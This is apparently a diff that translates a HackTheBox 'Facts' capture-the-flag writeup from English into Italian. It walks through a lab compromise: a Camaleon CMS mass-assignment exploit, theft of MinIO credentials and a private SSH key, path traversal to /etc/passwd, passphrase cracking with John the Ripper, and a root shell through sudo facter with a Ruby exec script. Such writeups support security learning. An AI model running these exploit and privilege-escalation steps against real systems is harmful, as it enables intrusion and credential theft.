@@ -1,34 +1,34 @@
 # Facts — HackTheBox Writeup
 
-> **Difficulty:** Medium  
+> **Difficoltà:** Media  
 > **OS:** Linux (Ubuntu 25.04)  
-> **Category:** Web, Privilege Escalation  
-> **CVEs Involved:** CVE-2025-2304, CVE-2024-46987
+> **Categoria:** Web, Privilege Escalation  
+> **CVE Coinvolte:** CVE-2025-2304, CVE-2024-46987
 
 ---
 
-## 📋 Overview
+## 📋 Panoramica
 
-The **Facts** machine hosts an installation of **Camaleon CMS 2.9.0** affected by two critical vulnerabilities:
+La macchina **Facts** ospita un'installazione di **Camaleon CMS 2.9.0** affetta da due vulnerabilità critiche:
 - **CVE-2025-2304** — Authenticated Privilege Escalation via Mass Assignment
-- **CVE-2024-46987** — Arbitrary Path Traversal for reading arbitrary files
+- **CVE-2024-46987** — Arbitrary Path Traversal per la lettura di file arbitrari
 
-Initial access is achieved by extracting AWS credentials from the CMS and using them to access a **MinIO** bucket containing a private SSH key. Cracking the key's passphrase allows SSH login as an unprivileged user. Root privilege escalation is performed by abusing the `facter` binary, which can be executed via `sudo` without a password.
+L'accesso iniziale viene ottenuto estraendo le credenziali AWS dal CMS e utilizzandole per accedere a un bucket **MinIO** contenente una chiave SSH privata. Il cracking della passphrase della chiave permette il login SSH come utente non privilegiato. L'escalation dei privilegi a root viene eseguita sfruttando il binario `facter`, che può essere eseguito tramite `sudo` senza password.
 
 ---
 
-## 🔍 Phase 1 — Enumeration
+## 🔍 Fase 1 — Enumerazione
 
 ### Port Scan
 
-During the enumeration phase, two relevant ports are identified:
+Durante la fase di enumerazione, vengono identificate due porte rilevanti:
 
-| Port | Service | Notes |
+| Porta | Servizio | Note |
 |------|---------|-------|
-| 80/tcp | HTTP (Camaleon CMS) | Admin panel |
-| 54321/tcp | HTTP (MinIO / S3-compatible) | Internal object storage |
+| 80/tcp | HTTP (Camaleon CMS) | Pannello di amministrazione |
+| 54321/tcp | HTTP (MinIO / S3-compatible) | Storage di oggetti interno |
 
-Port `54321` returns significant headers:
+La porta `54321` restituisce header significativi:
 
 ```
 Content-Type: application/xml
@@ -37,9 +37,9 @@ X-Amz-Request-Id
 X-Amz-Id-2
 ```
 
-> The `Amz` prefixes and S3-style XML response confirm this is a **MinIO** service — an Amazon S3-compatible object storage server. The redirect to `http://facts.htb:9001` also reveals a separate MinIO web console.
+> I prefissi `Amz` e la risposta XML in stile S3 confermano che si tratta di un servizio **MinIO** — un server di storage di oggetti compatibile con Amazon S3. Il reindirizzamento a `http://facts.htb:9001` rivela inoltre una console web MinIO separata.
 
-**Identified architecture:**
+**Architettura identificata:**
 ```
 [ Camaleon CMS :80 ] ──→ [ MinIO Storage :54321 ]
                                     ↕
@@ -48,46 +48,46 @@ X-Amz-Id-2
 
 ---
 
-## 🌐 Phase 2 — CMS Initial Access
+## 🌐 Fase 2 — Accesso Iniziale al CMS
 
-### Registration and Login
+### Registrazione e Login
 
-The `/admin` endpoint exposes a login panel that also **allows open registration**. A standard user account is created:
+L'endpoint `/admin` espone un pannello di login che **consente anche la registrazione aperta**. Viene creato un account utente standard:
 <p align="center">
   <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-3.png" width="500">
 </p>
 - **Username:** `bob`  
 - **Password:** `bob`
 
-After logging in, the **Camaleon CMS version 2.9.0** admin panel is accessible.
+Dopo il login, è possibile accedere al pannello di amministrazione di **Camaleon CMS versione 2.9.0**.
 <p align="center">
   <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-4.png" width="500">
 </p>
 
 ---
 
-## ⚠️ Phase 3 — CVE-2025-2304: Privilege Escalation (Mass Assignment)
+## ⚠️ Fase 3 — CVE-2025-2304: Privilege Escalation (Mass Assignment)
 
-### Vulnerability Details
+### Dettagli Vulnerabilità
 
-| Field | Detail |
-|-------|--------|
+| Campo | Dettaglio |
+|-------|-----------|
 | **CVE** | CVE-2025-2304 |
-| **Type** | Mass Assignment / Privilege Escalation |
-| **Authentication** | Required (standard user) |
-| **CVSS v3.0** | 8.8 (High) |
-| **CVSS v4.0** | 9.4 (Critical) |
+| **Tipo** | Mass Assignment / Privilege Escalation |
+| **Autenticazione** | Richiesta (utente standard) |
+| **CVSS v3.0** | 8.8 (Alto) |
+| **CVSS v4.0** | 9.4 (Critico) |
 
-**Root Cause:** The `updated_ajax` method in `UsersController` uses `permit!` without any parameter filtering. This allows an attacker to submit arbitrary fields — such as `role` — during a password change request, modifying their user role without authorization.
+**Root Cause:** Il metodo `updated_ajax` nel controller `UsersController` utilizza `permit!` senza alcun filtraggio dei parametri. Ciò consente a un attaccante di inviare campi arbitrari — come `role` — durante una richiesta di cambio password, modificando il proprio ruolo utente senza autorizzazione.
 
-**Impact:** A user with the `client` role can escalate to `admin` with a single crafted HTTP request.
+**Impatto:** Un utente con il ruolo `client` può passare a `admin` con una singola richiesta HTTP manipolata.
 
-### Exploitation
+### Sfruttamento
 
-The public exploit available on GitHub is used:  
+Viene utilizzato l'exploit pubblico disponibile su GitHub:  
 🔗 [CVE-2025-2304 exploit.py](https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py)
 
-**Step 1 — Escalate role to `admin`:**
+**Step 1 — Scalata del ruolo a `admin`:**
 
 ```sh
 └─$ python exploit.py -u http://facts.htb -U bob -P bob --newpass bob123
@@ -102,9 +102,9 @@ The public exploit available on GitHub is used:
 [+] Reverting User Role
 ```
 
-**Step 2 — Extract S3/MinIO credentials:**
+**Step 2 — Estrazione delle credenziali S3/MinIO:**
 
-The exploit includes a `-e` flag to extract AWS credentials stored in the CMS settings:
+L'exploit include il flag `-e` per estrarre le credenziali AWS memorizzate nelle impostazioni del CMS:
 
 ```sh
 └─$ python exploit.py -u http://facts.htb -U bob -P bob123 -e
@@ -120,25 +120,25 @@ The exploit includes a `-e` flag to extract AWS credentials stored in the CMS se
 [+] Reverting User Role
 ```
 
-> 💡 The same credentials can also be found manually in the **CMS Settings** (filesystem settings section in general settings http://facts.htb/admin/settings/site), without the exploit.
+> 💡 Le stesse credenziali possono essere trovate anche manualmente nelle **Impostazioni del CMS** (sezione impostazioni filesystem nelle impostazioni generali http://facts.htb/admin/settings/site), senza l'uso dell'exploit.
 
 ---
 
-## 🪣 Phase 4 — MinIO Access and SSH Key Retrieval
+## 🪣 Fase 4 — Accesso a MinIO e Recupero della Chiave SSH
 
-### AWS CLI Configuration
+### Configurazione AWS CLI
 
-The extracted credentials are configured in the AWS CLI to interact with the MinIO server:
+Le credenziali estratte vengono configurate nell'AWS CLI per interagire con il server MinIO:
 
 ```sh
 aws configure
 # AWS Access Key ID:     AKIA7D2CD003BA5877FA
 # AWS Secret Access Key: BlrFaANgPifpFKoDgKYdjuRb8s0MKI0IrDlDq7Y2
 # Default region name:   us-east-1
-# Default output format: (leave blank)
+# Default output format: (lasciare vuoto)
 ```
 
-### Listing Buckets
+### Elenco dei Bucket
 
 ```sh
 └─$ aws --endpoint-url http://facts.htb:54321 s3 ls
@@ -147,9 +147,9 @@ aws configure
 2025-09-11 08:06:52 randomfacts
 ```
 
-Two buckets found: `internal` (interesting) and `randomfacts` (public site images).
+Trovati due bucket: `internal` (interessante) e `randomfacts` (immagini pubbliche del sito).
 
-### Exploring the `internal` Bucket
+### Esplorazione del Bucket `internal`
 
 ```sh
 └─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
@@ -163,9 +163,9 @@ PRE .ssh/
     .profile
 ```
 
-> ⚠️ The `internal` bucket appears to be a **user's home directory exposed as an S3 bucket**. The `.ssh/` folder is particularly interesting.
+> ⚠️ Il bucket `internal` sembra essere la **home directory di un utente esposta come bucket S3**. La cartella `.ssh/` è particolarmente interessante.
 
-### Downloading the Private SSH Key
+### Download della Chiave SSH Privata
 
 ```sh
 └─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
@@ -175,28 +175,28 @@ PRE .ssh/
 ```
 
 ```sh
-# Download the private key
+# Scarica la chiave privata
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
 
-# Set correct permissions (required for SSH)
+# Imposta i permessi corretti (richiesto per SSH)
 chmod 600 id_ed25519
 ```
 
 ---
 
-## 👤 Phase 5 — User Enumeration via CVE-2024-46987
+## 👤 Fase 5 — Enumerazione Utenti via CVE-2024-46987
 
-### Vulnerability Details
+### Dettagli Vulnerabilità
 
-| Field | Detail |
-|-------|--------|
+| Campo | Dettaglio |
+|-------|-----------|
 | **CVE** | CVE-2024-46987 |
-| **Type** | Arbitrary Path Traversal (authenticated) |
+| **Tipo** | Arbitrary Path Traversal (autenticato) |
 | **Endpoint** | `/admin/media/download_private_file` |
 
-The `file` parameter is not validated, allowing filesystem traversal using `../` sequences.
+Il parametro `file` non è validato, consentendo l'attraversamento del filesystem tramite sequenze `../`.
 
-### Reading `/etc/passwd`
+### Lettura di `/etc/passwd`
 
 ```
 http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
@@ -210,29 +210,29 @@ trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
 william:x:1001:1001::/home/william:/bin/bash
 ```
 
-**Users identified:** `root`, `trivia`, `william`
+**Utenti identificati:** `root`, `trivia`, `william`
 
 ---
 
-## 🔐 Phase 6 — SSH Access and Passphrase Cracking
+## 🔐 Fase 6 — Accesso SSH e Cracking della Passphrase
 
-### Initial SSH Attempt
+### Tentativo SSH Iniziale
 
-The `id_ed25519` key found in the `internal` bucket belongs to user `trivia` (whose home directory was exposed as a bucket). However, the key is passphrase-protected:
+La chiave `id_ed25519` trovata nel bucket `internal` appartiene all'utente `trivia` (la cui home directory era esposta come bucket). Tuttavia, la chiave è protetta da passphrase:
 
 ```sh
 └─$ ssh -i id_ed25519 trivia@facts.htb
 Enter passphrase for key 'id_ed25519':
 ```
 
-### Cracking with John the Ripper
+### Cracking con John the Ripper
 
-**Step 1 — Convert the key to a crackable hash format:**
+**Step 1 — Convertire la chiave in un formato hash crackabile:**
 ```sh
 ssh2john id_ed25519 > hash.txt
 ```
 
-**Step 2 — Dictionary attack with rockyou:**
+**Step 2 — Attacco a dizionario con rockyou:**
 ```sh
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
@@ -247,9 +247,9 @@ dragonballz      (id_ed25519)
 Session completed.
 ```
 
-> ✅ **Passphrase found:** `dragonballz`
+> ✅ **Passphrase trovata:** `dragonballz`
 
-### Successful SSH Login
+### Login SSH Successivo
 
 ```sh
 └─$ ssh -i id_ed25519 trivia@facts.htb
@@ -268,10 +268,10 @@ trivia@facts:~$
 trivia@facts:/home$ cd william/
 trivia@facts:/home/william$ cat user.txt
 
-********************************
+cd8d5***************************
 ```
 
-> **Alternative via Path Traversal (no SSH needed):**  
+> **Alternativa via Path Traversal (nessun SSH richiesto):**  
 > `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/william/user.txt`
 
 <p align="center">
@@ -280,9 +280,9 @@ trivia@facts:/home/william$ cat user.txt
 
 ---
 
-## 🔺 Phase 7 — Privilege Escalation to Root (Facter Abuse)
+## 🔺 Fase 7 — Privilege Escalation a Root (Abuso di Facter)
 
-### Local Enumeration
+### Enumerazione Locale
 
 ```sh
 trivia@facts:/home$ id
@@ -298,11 +298,11 @@ User trivia may run the following commands on facts:
     (ALL) NOPASSWD: /usr/bin/facter
 ```
 
-> User `trivia` can run `/usr/bin/facter` as `root` **without a password**.
+> L'utente `trivia` può eseguire `/usr/bin/facter` come `root` **senza password**.
 
-### What is Facter?
+### Cos'è Facter?
 
-`facter` is a Ruby-based system information collection tool used by Puppet. It supports **custom facts** — Ruby scripts loaded from user-specified directories via `--custom-dir`. Since the process runs as root, any code inside those scripts executes with root privileges.
+`facter` è uno strumento di raccolta informazioni di sistema basato su Ruby, utilizzato da Puppet. Supporta **custom facts** — script Ruby caricati da directory specificate dall'utente tramite `--custom-dir`. Poiché il processo viene eseguito come root, qualsiasi codice all'interno di questi script viene eseguito con privilegi di root.
 
 ```sh
 trivia@facts:/usr/bin$ cat facter
@@ -321,15 +321,15 @@ CliLauncher.start(processed_arguments)
   <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-2.png" width="500">
 </p>
 
-### Exploit — Ruby RCE via Custom Fact
+### Exploit — RCE Ruby tramite Custom Fact
 
-The `--custom-dir` flag allows specifying a directory from which arbitrary Ruby scripts are loaded. Since `facter` runs as `root`, any code in those scripts is executed with root privileges.
+Il flag `--custom-dir` consente di specificare una directory da cui caricare script Ruby arbitrari. Poiché `facter` è eseguito come `root`, qualsiasi codice in tali script viene eseguito con privilegi di root.
 
 ```sh
-# Step 1: create a malicious Ruby script in /tmp
+# Step 1: crea uno script Ruby malevolo in /tmp
 trivia@facts:/usr/bin$ echo 'exec "/bin/bash"' > /tmp/x.rb
 
-# Step 2: run facter with sudo, pointing to /tmp as custom-dir
+# Step 2: esegui facter con sudo, puntando a /tmp come custom-dir
 trivia@facts:/usr/bin$ sudo facter --custom-dir=/tmp x
 ```
 
@@ -337,7 +337,7 @@ trivia@facts:/usr/bin$ sudo facter --custom-dir=/tmp x
 root@facts:/usr/bin#
 ```
 
-> ✅ **Root shell obtained!**
+> ✅ **Shell root ottenuta!**
 
 ---
 
@@ -354,44 +354,44 @@ cfcf8***************************
 
 ---
 
-## 📊 Attack Summary
+## 📊 Riepilogo dell'Attacco
 
 ```
-[Register account on CMS]
+[Registrazione account sul CMS]
         ↓
-[CVE-2025-2304: Escalate CMS role to admin]
+[CVE-2025-2304: Scalata del ruolo CMS ad admin]
         ↓
-[Extract AWS/MinIO credentials from CMS settings]
+[Estrazione credenziali AWS/MinIO dalle impostazioni del CMS]
         ↓
-[Access MinIO bucket → retrieve id_ed25519 private SSH key]
+[Accesso al bucket MinIO → recupero chiave SSH privata id_ed25519]
         ↓
-[CVE-2024-46987: Path Traversal → /etc/passwd → identify users]
+[CVE-2024-46987: Path Traversal → /etc/passwd → identificazione utenti]
         ↓
-[John the Ripper → crack SSH passphrase: dragonballz]
+[John the Ripper → cracking passphrase SSH: dragonballz]
         ↓
-[SSH login as trivia → User Flag]
+[Login SSH come trivia → User Flag]
         ↓
-[sudo facter --custom-dir=/tmp → RCE as root]
+[sudo facter --custom-dir=/tmp → RCE come root]
         ↓
 [Root Flag]
 ```
 
 ---
 
-## 🛠️ Tools Used
+## 🛠️ Tool Utilizzati
 
-| Tool                         | Purpose                                           |
+| Tool                         | Scopo                                             |
 | ---------------------------- | ------------------------------------------------- |
-| `nmap`                       | Port and service enumeration                      |
-| `exploit.py` (CVE-2025-2304) | CMS privilege escalation + credential extraction  |
-| `aws cli`                    | MinIO interaction (S3-compatible)                  |
-| `ssh2john`                   | Convert SSH key to crackable hash                 |
-| `john`                       | SSH passphrase cracking                           |
-| `facter`                     | Privilege escalation to root                      |
+| `nmap`                       | Enumerazione porte e servizi                      |
+| `exploit.py` (CVE-2025-2304) | Privilege escalation CMS + estrazione credenziali  |
+| `aws cli`                    | Interazione MinIO (S3-compatible)                 |
+| `ssh2john`                   | Conversione chiave SSH in hash crackabile         |
+| `john`                       | Cracking della passphrase SSH                     |
+| `facter`                     | Privilege escalation a root                       |
 
 ---
-## 📚 Lessons Learned  
+## 📚 Lezioni Apprese  
   
-- Misconfigured storage backends can expose critical data  
-- Web vulnerabilities often lead to full system compromise  
-- Ruby tools in sudo are common vectors for privilege escalation
+- I backend di storage mal configurati possono esporre dati critici  
+- Le vulnerabilità web spesso portano alla compromissione completa del sistema  
+- I tool Ruby in sudo sono vettori comuni per la privilege escalation
